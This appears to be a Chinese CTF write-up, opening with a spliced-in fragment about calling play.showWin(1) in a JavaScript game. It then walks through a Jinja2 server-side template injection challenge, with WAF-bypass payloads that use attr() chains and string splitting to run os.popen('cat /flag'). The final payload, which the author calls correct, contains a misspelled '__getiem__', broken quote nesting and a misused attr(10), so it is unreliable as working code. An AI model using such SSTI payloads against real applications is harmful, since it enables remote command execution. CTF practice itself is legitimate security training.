突破点在最后
play.showWin = function (my)详解:这是 JavaScript 中定义一个方法（函数）的语法
即给 play 这个对象添加一个 showWin 方法，这个方法实际上是一个函数，接收 my 参数用来显示游戏结果，注意my 是形参
但是调用方式不同：函数直接 函数名()，方法通过 对象.方法名()
所以payload为play.showWin(1)
具体执行过程为：首先找到play对象(因为showWin属于play对象 不在全局) 然后从play里取出showWin属性 最后调用这个方法并且传入参数 1
实现了my === 1符合判断条件
得到flag

题目来源：buuctf GenShin
题目链接(http://8d98d074cd6443fd50a0a971.http-ctf2.dasctf.com/)
题目描述：
解题思路：
启动靶机 得到

查看源码

发现没有线索 抓包试试

发现 /secr3tofpop 这个目录或文件访问一下

需要通过GET传参传递一个 name 参数

猜测name是注入点 试一下ssti注入 payload:`?name=${{7*7}}`

思路正确 但是`{{7*7}}` 被拦截了 尝试各种情况 发现`{% print(7*7) %}`可以得到49 说明拦截了最常见的 `{{`  但忽略了 `{%` 

首先`{% print(config) %}`判断是Twig还是Jinja2

得到
是 Jinja2 Python Flask框架

payload:`{% print(config.__class__.__init__.__globals__['os'].popen('cat /flag').read()) %}`


发现被拦截
正确的payload:

`?name={%print""|attr('__class__')|attr('__base__')|attr('__subclasses__')|attr(10)|attr('__in'+'it__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getiem__')('e'+'val')("ev"+"al('__import__('os').po'+'pen('cat /flag').read()')")%}`

该题利用了1.字符串拼接（'__in'+'it__'）
2.用 attr() 代替点号
3.用 __getitem__() 代替 []
4.用 eval() 执行最终代码(这是重点)
5.所有危险词都在字符串内部

6.`{% print() %}`执行并输出 并且`print` 后面必须加空格 否则 Jinja2 解析器会认不出来 7.{{ 变量 | 过滤器 }}绕过 WAF 对点号 `.` 的检测

除去这些绕过 整个链为''.__class__.__base__.__subclasses__()[10].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")

**通用做法**:1. 先执行 `{{ ''.__class__.__base__.__subclasses__() }}` 查看所有类 
    2. 找到合适的类
    3. 记录索引号，再用 `[索引]` 取用
    4.取出 eval 并执行命令

整个payload：
.__class__获取字符串的类（<class 'str'>)
.__base__获取父类（<class 'object'>）
.__subclasses__()获取所有子类列表
[10]取第10个子类 (这个题目取任意值应该都可以 我尝试了1，8，9，10，100都能拿到flag)
.__init__获取初始化方法
.__globals__获取全局变量字典
['__builtins__']获取内置函数
['eval']获取 eval 函数
("__import__('os').popen('cat /flag').read()")要执行的代码
